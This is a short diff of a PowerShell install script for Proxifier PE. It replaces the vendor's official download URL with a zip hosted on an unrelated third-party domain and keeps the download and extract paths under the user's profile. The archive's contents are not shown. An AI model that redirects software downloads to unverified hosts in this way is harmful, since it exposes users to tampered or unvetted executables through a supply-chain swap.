@@ -1,6 +1,6 @@
 $ErrorActionPreference = "Stop"
 
-$url = "https://www.proxifier.com/download/ProxifierPE.zip"
+$url = "https://123static.szxiot.com/Soft/git/ProxifierPE.zip"
 $zipPath = "$env:USERPROFILE\Downloads\ProxifierPE.zip"
 $extractPath = $env:USERPROFILE
 $desktopPath = [Environment]::GetFolderPath("Desktop")
